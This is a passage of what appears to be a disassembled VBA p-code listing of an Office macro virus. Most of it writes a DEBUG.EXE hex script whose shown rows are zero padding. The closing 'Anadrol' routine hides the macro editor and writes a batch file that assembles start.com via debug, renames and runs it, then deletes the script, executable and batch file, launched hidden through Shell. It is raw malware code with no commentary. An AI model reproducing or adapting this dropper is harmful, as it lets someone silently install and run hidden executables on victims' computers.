' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #534:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #535:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #536:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #537:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #538:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #539:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #540:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #541:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #542:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1930 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #543:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #544:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #545:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #546:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #547:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #548:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #549:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 19A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #550:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 19B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #551:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 19C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #552:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 19D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #553:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 19E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #554:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 19F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #555:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #556:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #557:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #558:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #559:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #560:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #561:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #562:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #563:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #564:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1A90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #565:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1AA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #566:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1AB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #567:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1AC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #568:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1AD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #569:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1AE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #570:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1AF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #571:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #572:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #573:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #574:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #575:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #576:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #577:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #578:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #579:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #580:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1B90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #581:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1BA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #582:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1BB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #583:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1BC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #584:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1BD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #585:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1BE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #586:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1BF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #587:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #588:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #589:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #590:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #591:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #592:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #593:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #594:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #595:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #596:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1C90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #597:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1CA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #598:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1CB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #599:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1CC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #600:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1CD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #601:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1CE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #602:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1CF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #603:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #604:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #605:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #606:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #607:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #608:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #609:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #610:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #611:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #612:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1D90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #613:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1DA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #614:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1DB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #615:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1DC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #616:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1DD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #617:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1DE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #618:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1DF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #619:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #620:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #621:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #622:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #623:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #624:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #625:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #626:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #627:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #628:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1E90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #629:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1EA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #630:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1EB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #631:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1EC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #632:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1ED0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #633:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1EE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #634:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1EF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #635:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #636:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #637:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #638:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #639:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #640:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #641:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #642:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #643:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #644:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #645:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1FA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #646:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1FB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #647:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1FC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #648:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1FD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #649:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1FE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #650:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1FF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #651:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #652:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #653:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #654:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #655:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #656:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #657:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #658:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #659:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #660:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #661:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 20A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #662:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 20B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #663:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 20C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #664:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 20D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #665:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 20E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #666:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 20F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #667:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "RCX"
' 	PrintItemNL 
' Line #668:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "2000"
' 	PrintItemNL 
' Line #669:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "W"
' 	PrintItemNL 
' Line #670:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "Q"
' 	PrintItemNL 
' Line #671:
' 	Ld hFile 
' 	Close 0x0001 
' Line #672:
' 	EndSub 
' Line #673:
' 	FuncDefn (Sub Anadrol(strFile As String))
' Line #674:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #675:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #676:
' 	Ld hFile 
' 	Close 0x0001 
' Line #677:
' 	OnError (Resume Next) 
' Line #678:
' 	Ld Friend 
' 	St hFile 
' Line #679:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #680:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #681:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cd\"
' 	PrintItemNL 
' Line #682:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "debug < start.scr > nul"
' 	PrintItemNL 
' Line #683:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "copy start.com start.exe"
' 	PrintItemNL 
' Line #684:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "del start.com"
' 	PrintItemNL 
' Line #685:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "del start.scr"
' 	PrintItemNL 
' Line #686:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "start"
' 	PrintItemNL 
' Line #687:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "del start.exe"
' 	PrintItemNL 
' Line #688:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "del Anadrol.bat"
' 	PrintItemNL 
' Line #689:
' 	Ld hFile 
' 	Close 0x0001 
' Line #690:
' 	LitStr 0x000E "c:\Anadrol.bat"
' 	Paren 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #691:
' Line #692:
' 	QuoteRem 0x0004 0x000C "Produced by,"
' Line #693:
